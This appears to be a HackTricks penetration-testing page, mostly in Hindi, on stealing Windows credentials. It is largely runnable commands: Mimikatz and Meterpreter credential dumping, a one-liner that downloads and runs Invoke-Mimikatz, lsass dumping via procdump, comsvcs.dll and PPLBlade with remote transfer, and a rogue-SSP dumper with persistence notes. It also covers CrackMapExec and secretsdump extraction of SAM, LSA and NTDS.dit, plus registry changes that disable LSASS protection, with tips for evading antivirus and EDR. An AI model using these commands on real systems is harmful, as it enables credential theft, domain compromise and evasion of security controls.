# Windows Credentials चोरी करना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz और क्या कर सकता है जानने के लिए** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ credentials निकालने से रोक सकते हैं।**

## Credentials के साथ Meterpreter

इस्तेमाल करें [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **जो** मैंने बनाया है, ताकि victim के अंदर **passwords और hashes** खोजे जा सकें।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

चूँकि **Procdump से** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft टूल है**, यह Defender द्वारा पता नहीं लगाया जाता।\
आप इस टूल का उपयोग करके **dump the lsass process**, **download the dump** और **extract** the **credentials locally** from the dump.

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
यह प्रक्रिया स्वतः [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**नोट**: कुछ **AV** procdump.exe to dump lsass.exe के उपयोग को **malicious** के रूप में **detect** कर सकते हैं, यह इसलिए है क्योंकि वे **"procdump.exe" and "lsass.exe"** स्ट्रिंग को **detect** कर रहे हैं। इसलिए procdump को lsass.exe के नाम के बजाय lsass.exe का **PID** एक **argument** के रूप में **pass** करना अधिक **stealthier** है।

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32` में स्थित **comsvcs.dll** नामक एक DLL क्रैश की स्थिति में **dumping process memory** के लिए जिम्मेदार है। इस DLL में `MiniDumpW` नामक एक **function** शामिल है, जिसे `rundll32.exe` के माध्यम से invoke करने के लिए डिज़ाइन किया गया है।\
पहले दो arguments का उपयोग प्रासंगिक नहीं है, लेकिन तीसरा argument तीन घटकों में विभाजित होता है। जिस process ID को dump करना है वह पहला घटक होता है, dump फ़ाइल का स्थान दूसरा घटक होता है, और तीसरा घटक सख्ती से शब्द **full** होना चाहिए। कोई वैकल्पिक विकल्प मौजूद नहीं है।\
इन तीन घटकों को पार्स करने के बाद, DLL dump फ़ाइल बनाने और निर्दिष्ट process की memory को इस फ़ाइल में स्थानांतरित करने में लग जाता है।\
**comsvcs.dll** का उपयोग lsass process को dump करने के लिए संभव है, जिससे procdump को upload और execute करने की आवश्यकता समाप्त हो जाती है। यह विधि विस्तार से [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) पर वर्णित है।

निम्नलिखित command निष्पादन के लिए उपयोग किया जाता है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को स्वचालित कर सकते हैं** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **lsass को Task Manager से डंप करना**

1. Task Bar पर राइट-क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes टैब में "Local Security Authority Process" प्रोसेस खोजें
4. "Local Security Authority Process" प्रोसेस पर राइट-क्लिक करें और "Create dump file" पर क्लिक करें।

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा साइन किया गया एक बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सुइट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass को डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो memory dump को obfuscate करने और इसे disk पर छोड़े बिना remote workstations पर transfer करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. Bypassing PPL protection
2. memory dump files को obfuscate करना ताकि Defender के signature-based detection mechanisms को evade किया जा सके
3. RAW और SMB upload methods का उपयोग करके memory dump को disk पर छोड़े बिना upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon एक तीन-चरण वाला dumper प्रदान करता है जिसे **LalsDumper** कहा जाता है, जो कभी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर लगे EDR hooks कभी ट्रिगर नहीं होते:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 छोटे अक्षर `d` से बना placeholder खोजता है, उसे `rtu.txt` के absolute path से ओवरराइट कर देता है, patched DLL को `nfdp.dll` के रूप में सेव करता है, और `AddSecurityPackageA("nfdp","fdp")` को कॉल करता है। इससे **LSASS** को नया malicious DLL एक नया Security Support Provider (SSP) के रूप में लोड करने के लिए मजबूर किया जाता है।
2. **Stage 2 inside LSASS** – जब LSASS `nfdp.dll` लोड करता है, DLL `rtu.txt` पढ़ता है, प्रत्येक बाइट को `0x20` के साथ XOR करता है, और निष्पादन सौंपने से पहले डिकोड किए गए ब्लॉब को मेमोरी में मैप कर देता है।
3. **Stage 3 dumper** – मैप किया गया payload MiniDump लॉजिक को फिर से लागू करता है, जो हेश्ड API नामों से हल किये गए **direct syscalls** का उपयोग करता है (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` नामक एक समर्पित export `%TEMP%\<pid>.ddt` खोलता है, फ़ाइल में एक compressed LSASS dump स्ट्रीम करता है, और हैंडल बंद कर देता है ताकि बाद में exfiltration हो सके।

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, और `rtu.txt` को एक ही डायरेक्टरी में रखें। Stage 1 हार्ड-कोडेड placeholder को `rtu.txt` के absolute path से फिर से लिखता है, इसलिए इन्हें विभाजित करने से चेन टूट जाएगी।
* रजिस्ट्रेशन `nfdp` को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में जोड़कर होता है। आप स्वयं उस वैल्यू को seed कर सकते हैं ताकि LSASS हर बूट पर SSP को reload करे।
* `%TEMP%\*.ddt` फाइलें compressed dumps हैं। इन्हें लोकली decompress करें, फिर credential extraction के लिए Mimikatz/Volatility को दें।
* `lals.exe` चलाने के लिए admin/SeTcb अधिकारों की आवश्यकता होती है ताकि `AddSecurityPackageA` सफल हो; एक बार कॉल लौट आने पर, LSASS पारदर्शी रूप से rogue SSP को लोड कर Stage 2 को execute करता है।
* डिस्क से DLL हटाने से यह LSASS से बाहर नहीं निकलता। या तो रजिस्ट्री एंट्री को डिलीट करें और LSASS को restart करें (reboot) या इसे long-term persistence के लिए छोड़ दें।

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्षित DC से NTDS.dit Dump करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्षित DC से NTDS.dit का पासवर्ड इतिहास डंप करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet attribute दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

ये फाइलें **स्थित** _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM._ में होनी चाहिए। लेकिन **आप उन्हें सामान्य तरीके से बस कॉपी नहीं कर सकते** क्योंकि वे संरक्षित हैं।

### From Registry

उन फाइलों को चुराने का सबसे आसान तरीका registry से उनकी कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**डाउनलोड करें** उन फ़ाइलों को अपनी Kali मशीन पर और **hashes निकालें** का उपयोग करके:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके संरक्षित फ़ाइलों की प्रतिलिपि बना सकते हैं। आपको Administrator होना चाहिए।

#### vssadmin का उपयोग

vssadmin binary केवल Windows Server संस्करणों में ही उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप वही काम **Powershell** से भी कर सकते हैं। यह एक उदाहरण है कि **SAM file को कैसे कॉपी करें** (यूज़ किया गया हार्ड ड्राइव "C:" है और इसे C:\users\Public पर सेव किया गया है) लेकिन आप इसे किसी भी सुरक्षित फ़ाइल को कॉपी करने के लिए उपयोग कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
किताब से कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की एक प्रति बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory क्रेडेंशियल्स - NTDS.dit**

The **NTDS.dit** फ़ाइल को **Active Directory** का हृदय माना जाता है, यह user objects, groups, और उनकी memberships के महत्वपूर्ण डेटा को रखती है। यही वह जगह है जहाँ domain users के **password hashes** संग्रहीत होते हैं। यह फ़ाइल एक **Extensible Storage Engine (ESE)** database है और यह **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित होती है।

इस database के भीतर तीन मुख्य tables बनाए और रखे जाते हैं:

- **Data Table**: यह table user और group जैसे objects के विवरण संग्रहीत करने का काम करती है।
- **Link Table**: यह संबंधों का ट्रैक रखती है, जैसे group memberships।
- **SD Table**: यहाँ प्रत्येक object के लिए **Security descriptors** रखे जाते हैं, जो संग्रहीत objects की सुरक्षा और access control सुनिश्चित करते हैं।

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows उस फ़ाइल के साथ इंटरैक्ट करने के लिए _Ntdsa.dll_ का उपयोग करता है और यह _lsass.exe_ द्वारा उपयोग में लिया जाता है। इसलिए, **NTDS.dit** फ़ाइल का एक **भाग** संभवतः **`lsass`** की memory के अंदर मौजूद हो सकता है (आप यहाँ हाल ही में एक्सेस किया गया डेटा पा सकते हैं, संभवतः performance सुधार के लिए उपयोग किए गए **cache** के कारण)।

#### NTDS.dit के अंदर hashes को डिक्रिप्ट करना

Hash को 3 बार साइफर किया जाता है:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** का मान **हर domain controller** में **एक जैसा** होता है, लेकिन इसे **NTDS.dit** फ़ाइल के अंदर domain controller के **SYSTEM** फ़ाइल के **BOOTKEY** से **साइफर** किया जाता है (यह प्रत्येक domain controller के लिए अलग होता है)। इसी वजह से NTDS.dit फ़ाइल से credentials निकालने के लिए **आपको NTDS.dit और SYSTEM फाइलें चाहिए** (_C:\Windows\System32\config\SYSTEM_)।

### NTDS.dit को Ntdsutil के साथ कॉपी करना

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप [**volume shadow copy**](#stealing-sam-and-system) ट्रिक का उपयोग करके **ntds.dit** फ़ाइल की कॉपी भी बना सकते हैं। ध्यान रखें कि आपको **SYSTEM file** की एक प्रति भी चाहिए होगी (फिर से, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) ट्रिक)।

### **NTDS.dit से हैश निकालना**

एक बार जब आपके पास **NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त** हो जाएँ, तो आप _secretsdump.py_ जैसे टूल्स का उपयोग करके **हैश निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक मान्य domain admin user का उपयोग करके भी **उन्हें स्वचालित रूप से निकाल सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**बड़ी NTDS.dit फ़ाइलों** के लिए, इसे निकालने के लिए [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करने की सलाह दी जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से डोमेन ऑब्जेक्ट्स को SQLite डेटाबेस में निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ एक SQLite डेटाबेस में निकाला जा सकता है। केवल secrets ही नहीं निकाले जाते, बल्कि पूरे ऑब्जेक्ट्स और उनके attributes भी निकाले जाते हैं, ताकि जब raw NTDS.dit फ़ाइल पहले से प्राप्त हो, तो आगे की जानकारी निकाली जा सके।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive वैकल्पिक है लेकिन secrets को डिक्रिप्ट करने की अनुमति देता है (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Binary को [here](https://github.com/AlessandroZ/LaZagne/releases) से डाउनलोड करें। आप इस binary का उपयोग कई सॉफ़्टवेयर से credentials निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के अन्य टूल

### Windows credentials Editor (WCE)

यह टूल मेमोरी से credentials निकालने के लिए उपयोग किया जा सकता है। इसे डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फ़ाइल से credentials निकालता है।
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से credentials निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस **इसे चलाएँ** और पासवर्ड निकाले जाएंगे।

## निष्क्रिय RDP सेशन्स का खनन और सुरक्षा नियंत्रणों को कमजोर करना

Ink Dragon’s FinalDraft RAT में `DumpRDPHistory` tasker शामिल है जिसकी तकनीकें किसी भी red-teamer के लिए उपयोगी हैं:

### DumpRDPHistory-style टेलीमेट्री संग्रह

* **Outbound RDP targets** – हर user hive को `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर पार्स करें। प्रत्येक subkey में server name, `UsernameHint`, और last write timestamp स्टोर रहता है। आप PowerShell से FinalDraft की लॉजिक को replicate कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग में Event IDs **21** (सफल लॉगऑन) और **25** (डिसकनेक्ट) के लिए क्वेरी करें ताकि पता चल सके किसने बॉक्स का प्रशासन किया:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

एक बार जब आप जान लें कि कौन सा Domain Admin नियमित रूप से कनेक्ट करता है, तो उनके **डिसकनेक्टेड** session अभी मौजूद रहते हुए LSASS (LalsDumper/Mimikatz के साथ) dump करें। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें बाद में SMB/WinRM पर replay करके `NTDS.dit` पकड़ने या domain controllers पर persistence stage करने के लिए प्रयोग किया जा सकता है।

### FinalDraft द्वारा लक्षित Registry डाउनग्रेड्स
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` RDP के दौरान full credential/ticket reuse को मजबूर करता है, जिससे pass-the-hash style pivots सक्षम होते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को disable कर देता है ताकि local admins को नेटवर्क पर unrestricted tokens मिलें।
* `DSRMAdminLogonBehavior=2` DC online रहते समय DSRM administrator को log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिल जाता है।
* `RunAsPPL=0` LSASS PPL protections को हटा देता है, जिससे memory access dumpers (जैसे LalsDumper) के लिए trivial हो जाता है।

## संदर्भ

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
